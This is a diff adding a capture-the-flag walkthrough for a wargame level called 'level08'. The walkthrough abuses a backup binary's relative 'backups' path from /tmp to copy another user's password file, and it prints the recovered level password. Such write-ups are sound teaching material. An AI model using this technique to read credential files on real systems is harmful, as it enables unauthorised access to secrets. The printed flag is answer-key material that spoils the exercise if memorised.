@@ -1,0 +1,32 @@
+# level08
+
+## Testing the binary
+
+```sh
+$ ./level08
+Usage: ./level08 filename
+ERROR: Failed to open (null)
+$ ./level08 /dev/null
+ERROR: Failed to open ./backups//dev/null
+$ ./level08 ../../home/users/level09/.pass
+ERROR: Failed to open ../../home/users/level09/.pass
+$ ./level08 ../home/users/level09/.pass
+ERROR: Failed to open ../home/users/level09/.pass
+$
+```
+
+Seems like we can't do any kind of path traversal, so we'll have to find another way to read the password.
+
+## Analysis
+
+The binary is pretty simple, it takes a filename as argument, and tries to copy it to a file in the `backups` directory.
+
+It's like a basic backup program, but it uses a relative path to the `backups` directory, so we can trick it into writing it into our own directory.
+
+```sh
+$ cd /tmp
+$ mkdir -p backups/home/users/level09
+$ ~/level08 /home/users/level09/.pass
+$ cat backups/home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+```
